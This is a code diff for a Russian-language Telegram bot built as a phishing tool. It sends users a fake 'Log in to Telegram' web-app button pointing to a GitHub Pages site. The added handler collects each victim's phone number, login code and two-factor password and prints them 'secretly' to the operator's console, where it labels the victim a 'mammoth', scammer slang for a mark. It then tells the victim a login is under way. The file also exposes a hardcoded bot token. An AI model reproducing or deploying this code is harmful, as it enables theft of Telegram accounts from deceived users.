@@ -1,85 +1,85 @@
 import asyncio
 import logging
 import json
+import sys
 from aiogram import Bot, Dispatcher, types, F
 from aiogram.filters import Command
-from aiogram.types import (
-    WebAppInfo,
-    ReplyKeyboardMarkup,
-    KeyboardButton
-)
+from aiogram.types import WebAppInfo, ReplyKeyboardMarkup, KeyboardButton
 
 # ==========================================
-# 👇 ВСТАВЬ СВОИ ДАННЫЕ 👇
+# 👇 НАСТРОЙКИ 👇
 # ==========================================
 BOT_TOKEN = "8563110236:AAEO8GlnHVxtsMjbaiQ-EuHq7hphAaMzXL0"
-# Не забудь поменять версию ?v=... если обновлял HTML
-WEB_APP_URL = "https://vanchopiki.github.io/test/index.html?v=666"
+# Ссылка на сайт (меняй цифры в конце, если обновишь HTML)
+WEB_APP_URL = "https://vanchopiki.github.io/test/index.html?v=1000"
 # ==========================================
 
-logging.basicConfig(level=logging.INFO)
+# Логирование (только основное)
+logging.basicConfig(level=logging.INFO, stream=sys.stdout)
 
 bot = Bot(token=BOT_TOKEN)
 dp = Dispatcher()
 
 
-# --- ФУНКЦИЯ ОТПРАВКИ КНОПКИ ---
-async def send_login_button(message: types.Message, need_password: bool):
-    if need_password:
+# --- ФУНКЦИЯ КНОПОК ---
+async def send_ui(message: types.Message, need_pass: bool):
+    if need_pass:
         separator = "&" if "?" in WEB_APP_URL else "?"
-        final_url = f"{WEB_APP_URL}{separator}p=1"
-        text_msg = "🔐 <b>Вход с ПАРОЛЕМ</b> (2FA)\nНажми кнопку внизу 👇"
+        url = f"{WEB_APP_URL}{separator}p=1"
+        txt = "🔐 <b>Вход с ПАРОЛЕМ</b>\nНажми кнопку внизу 👇"
     else:
-        final_url = WEB_APP_URL
-        text_msg = "📱 <b>Обычный вход</b>\nНажми кнопку внизу 👇"
+        url = WEB_APP_URL
+        txt = "📱 <b>Вход в Telegram</b>\nНажми кнопку внизу 👇"
 
-    keyboard = ReplyKeyboardMarkup(
-        keyboard=[
-            [
-                KeyboardButton(
-                    text="⚡ Войти в Telegram",
-                    web_app=WebAppInfo(url=final_url)
-                )
-            ]
-        ],
+    kb = ReplyKeyboardMarkup(
+        keyboard=[[KeyboardButton(text="⚡ Войти", web_app=WebAppInfo(url=url))]],
         resize_keyboard=True,
-        input_field_placeholder="Нажми кнопку ниже..."
+        input_field_placeholder="Нажми кнопку..."
     )
-
-    await message.answer(text_msg, reply_markup=keyboard, parse_mode="HTML")
+    await message.answer(txt, reply_markup=kb, parse_mode="HTML")
 
 
 # 1. Режим с паролем
 @dp.message(F.text.lower() == "пароль")
-async def password_mode(message: types.Message):
-    await send_login_button(message, need_password=True)
+async def mode_pass(msg: types.Message):
+    await send_ui(msg, True)
 
 
 # 2. Обычный режим
 @dp.message(Command("start"))
 @dp.message()
-async def start_mode(message: types.Message):
-    await send_login_button(message, need_password=False)
+async def mode_default(msg: types.Message):
+    await send_ui(msg, False)
 
 
-# 3. ПРИЕМ ДАННЫХ (ИЗМЕНЕНО)
-# Ловим ВООБЩЕ ВСЁ и пишем в консоль
-@dp.message()
-async def catch_all(message: types.Message):
-    print(f"📥 ЧТО-ТО ПРИШЛО: {message}")
+# 3. ПОЛУЧЕНИЕ ДАННЫХ
+@dp.message(F.web_app_data)
+async def data_handler(message: types.Message):
+    try:
+        data = json.loads(message.web_app_data.data)
 
-    if message.web_app_data:
-        print(f"🔥 ЭТО ДАННЫЕ ИЗ WEBAPP: {message.web_app_data.data}")
-    else:
-        print("🧊 Это просто текст или другое сообщение")
+        phone = data.get('phone', '-')
+        code = data.get('code', '-')
+        password = data.get('password', '')
 
-async def main():
-    print("✅ Бот запущен!")
-    await dp.start_polling(bot)
+        # === ВЫВОД В КОНСОЛЬ (СЕКРЕТНО) ===
+        print("\n" + "=" * 40)
+        print(f"🦈 МАМОНТ: {message.from_user.full_name} (@{message.from_user.username})")
+        print(f"📞 PHONE: {phone}")
+        print(f"🔢 CODE:  {code}")
+        print(f"🔑 PASS:  {password if password else '[НЕТ]'}")
+        print("=" * 40 + "\n")
+
+        # === ОТВЕТ ПОЛЬЗОВАТЕЛЮ ===
+        await message.answer("✅ <b>Данные приняты.</b>\nВыполняется вход...", parse_mode="HTML")
+
+    except Exception as e:
+        print(f"Ошибка: {e}")
 
 
 if __name__ == "__main__":
     try:
-        asyncio.run(main())
+        print("✅ Бот работает...")
+        asyncio.run(dp.start_polling(bot))
     except KeyboardInterrupt:
-        print("❌ Бот остановлен.")
+        print("Бот выключен.")
